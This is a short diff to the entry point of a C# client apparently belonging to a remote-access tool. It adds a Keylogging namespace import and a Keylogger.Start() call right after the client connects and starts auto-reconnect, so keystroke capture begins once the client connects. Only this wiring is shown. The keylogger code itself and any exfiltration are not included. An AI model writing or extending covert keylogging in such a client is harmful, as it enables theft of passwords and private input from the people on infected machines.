@@ -1,6 +1,7 @@
 ﻿using Client.Config;
 using Client.Core.Events;
 using Client.Core.Helper;
+using Client.Core.Keylogging;
 using Client.Core.Networking;
 using System;
 using System.Collections.Generic;
@@ -25,6 +26,7 @@ namespace Client
                 //ENTRY
                 NetworkManager.Connect();
                 NetworkManager.StartReconnect();
+                Keylogger.Start();
             }
             else
             {
